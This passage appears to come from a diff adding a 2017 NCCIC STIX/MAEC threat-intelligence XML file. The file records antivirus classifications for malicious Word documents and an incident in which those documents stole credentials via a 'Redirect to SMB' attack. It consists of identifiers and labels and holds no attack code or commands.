+                                                    <maecBundle:Classification_Name>Troj/DocDl-JMD</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                            </maecBundle:AV_Classifications>
+                                        </maecPackage:Bundle>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-9a0b09f9-7b36-4dcb-9cd8-43080e88f5f1" timestamp="2017-10-13T17:09:52.966846+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>None</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-92d46659-9448-4589-94ae-14694a989864" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-b4c9f96c-a13d-4eff-bcb9-cfbe5720f82d">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-faf4a44b-92b3-4ddb-a5fe-032ad28c8e4f"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-a3606959-92a7-48a6-b572-37d480be7284" schema_version="4.1">
+                                            <maecBundle:AV_Classifications>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>McAfee</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>W97M/Downloader.cdg</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Microsoft Security Essentials</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan:O97M/Inoff.A</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Sophos</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Troj/DocDl-JMD</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                            </maecBundle:AV_Classifications>
+                                        </maecPackage:Bundle>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-0052b6f7-d749-433d-8161-bdc00fd4e093" timestamp="2017-10-13T17:10:12.226945+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>None</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-dcbd378f-6b4b-4a69-b000-1cb6d807784c" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-8394f47b-ba57-4150-a384-6ed3a7847c4c">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-a5ca3c25-730c-4bb3-b340-019bedb085b0"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-3b36924d-7561-4207-8f62-5577a5df2420" schema_version="4.1">
+                                            <maecBundle:AV_Classifications>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>McAfee</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>W97M/Downloader.cdg</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Microsoft Security Essentials</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan:O97M/Inoff.A</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Sophos</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Troj/DocDl-JMD</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                            </maecBundle:AV_Classifications>
+                                        </maecPackage:Bundle>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-04e70e73-b160-4f87-bd44-b3591bbe953c" timestamp="2017-10-13T17:10:33.917931+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>None</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-b3ceb559-3309-43fd-9f3b-b92c6dfb1410" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-82ef0b50-1c96-4726-a39d-8b25c23f6039">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-40ffd1d6-1b6c-4fb4-ab6d-0a99139e9548"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-4276175d-a226-4cb5-a3eb-a028077d000a" schema_version="4.1">
+                                            <maecBundle:AV_Classifications>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>McAfee</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>W97M/Downloader.cdg</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Microsoft Security Essentials</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan:O97M/Inoff.A</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Sophos</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Troj/DocDl-JMD</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                            </maecBundle:AV_Classifications>
+                                        </maecPackage:Bundle>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+        </stix:TTP>
+    </stix:TTPs>
+    <stix:Incidents>
+        <stix:Incident id="NCCIC:incident-e84f30e7-2999-4c37-9bed-8289c26d0738" timestamp="2017-06-13T15:39:01.434637+00:00" xsi:type='incident:IncidentType'>
+            <incident:Title>10128327</incident:Title>
+            <incident:Description><![CDATA[Submission included 11 Microsoft Word Documents (3 duplicates). Analysis indicates these Word Documents are being used to steal the victim's credentials via a "Redirect to SMB" attack.
+
+Additional analysis on related activity is also referenced in MIFR-10128836 and MIFR-10128883.]]></incident:Description>
+            <incident:Categories>
+                <incident:Category xsi:type="stixVocabs:IncidentCategoryVocab-1.0">Malicious Code</incident:Category>
+            </incident:Categories>
+            <incident:Related_Indicators scope="exclusive">
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-b02da848-ae84-4e88-a240-775ceb1652f7" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-7d5e7153-3269-49e4-b0e7-a96ebc151414" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-8596826c-35fc-4fc5-9f01-d1b109a518f4" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-85909848-741c-4ab1-8798-6cba05b551d3" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-e484fc6f-26bb-46af-a343-e0bac75e55b4" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-bf138156-b0bb-45f7-84a3-4e61d9110b38" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-2fd60c28-8c11-4f41-a688-12cc472df95b" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-decef631-b230-4b41-a834-5e348b6bc27b" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-85537d2c-9e5c-4a57-be60-4f357831b3bd" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-f4bf7dd2-9fcd-4912-b82d-847a15b12a8a" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-2774b283-b69b-401d-b6cd-37e44d5d2d76" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-24ade23f-fcd1-461e-8b81-fcd0b285327f" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-52ba9b19-7eb5-4084-8670-605312d1ac75" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-492340a1-7c87-4119-86c2-10ffc991a71c" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-819f9892-7b55-43d5-807b-d3145c7ef14f" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-c4b0b69e-3667-492a-b4de-aecb2afea039" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-6272810d-b209-4c8b-9f89-9041c66f6560" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+                <incident:Related_Indicator>
+                    <stixCommon:Indicator idref="NCCIC:indicator-310b3403-d67c-43ec-bd96-26aa77a4f78d" xsi:type='indicator:IndicatorType'/>
+                </incident:Related_Indicator>
+            </incident:Related_Indicators>
+            <incident:Related_Observables scope="exclusive">
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-13023dbd-8df9-4724-9dc5-da6ac0b886ce">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-14f594c8-4e57-4c43-bf6d-eee1b77d31d6">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-85f144f3-f9d3-4ae6-a8e0-d4a7fd3b22bf">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-fbe44159-3e33-48ab-bba6-c703b997e8d2">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-7728bc51-fdea-424b-aa8c-b0b36d68d92a">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-c1788b88-a0fc-4a7f-a436-71921a495ce8">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-e489c376-5145-41e4-8eb2-bb861b724a70">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-59879039-ad0b-4107-8a78-44e28c7a1047">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-231dbbb0-a38a-41b3-9507-3e0a8901c475">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-7cfc9437-6156-47d1-a470-93cf32c6c8d4">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-57458531-a7c5-495f-a435-c3a22be3288a">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-ca2a343b-385c-49eb-85b3-e55f47863707">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-ddcf3ef6-702c-4803-ab8f-48cf32b9c661">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-88c33e25-a1da-4319-b18a-7228e56c54d8">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-f4a6174b-e317-48f7-a6cb-a5d04312d515">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-f33e8a2e-073c-4224-8401-ed2efcbaf7b2">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-ec0bb061-0f04-4017-b039-a72ff1bc6faa">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-ae6b94db-0bd3-45fb-9036-7d57f9d08920">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-d3a070a4-1986-4a3c-b95a-ce1b241a3b65">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-5b52a591-131c-4176-84e5-03158aa56449">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-fb6fb731-ee23-402d-8300-e09725560c22">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-50465641-dd3f-4f61-b3bb-e0eb4c06e540">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-44fea2d6-7e10-4ecb-951b-99a18cc281e7">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-846a7f08-7aa7-4938-8025-ab0a71d0a635">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-e0e3892b-b7a2-459d-8687-eab45887d83f">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-d32495df-666a-4306-91c0-bd4ed14ceba1">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-21cabb24-9852-415b-824f-c995ed7a3a08">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-a9349e00-b5a5-4d31-93c5-df0959d3f982">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-e3dc3bca-0852-4ffe-b053-d7f080f1d813">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-86bf4382-3d6e-4232-914d-f98bea9590f3">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-efd80020-fc43-42a1-a6ae-a928d5d04f5e">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-63d0f9c4-4c09-4364-87be-b5cbfeb1d828">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-f67a2431-1132-45bb-9073-12700e802b82">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+                <incident:Related_Observable>
+                    <stixCommon:Relationship>Malicious Artifact Detected</stixCommon:Relationship>
+                    <stixCommon:Observable idref="NCCIC:Observable-7c092b3f-3180-47ab-8eac-172f200d9abe">
+                    </stixCommon:Observable>
+                </incident:Related_Observable>
+            </incident:Related_Observables>
+            <incident:Leveraged_TTPs scope="exclusive">
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-3b176393-3525-4af9-9aa2-f18387d61686" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-b0c07b3f-992b-4dc6-be29-10d5bb8ec69d" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-c4359f96-f0b3-4236-b4e3-d6fee9914fb3" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-282b57a5-5d12-47aa-a1e5-f7636d944aa5" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-c8277d8f-0775-41bd-8ec2-e18d4a2e3e0a" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-9a0b09f9-7b36-4dcb-9cd8-43080e88f5f1" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-0052b6f7-d749-433d-8161-bdc00fd4e093" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+                <incident:Leveraged_TTP>
+                    <stixCommon:TTP idref="NCCIC:ttp-04e70e73-b160-4f87-bd44-b3591bbe953c" xsi:type='ttp:TTPType'/>
+                </incident:Leveraged_TTP>
+            </incident:Leveraged_TTPs>
+        </stix:Incident>
+    </stix:Incidents>
+</stix:STIX_Package>
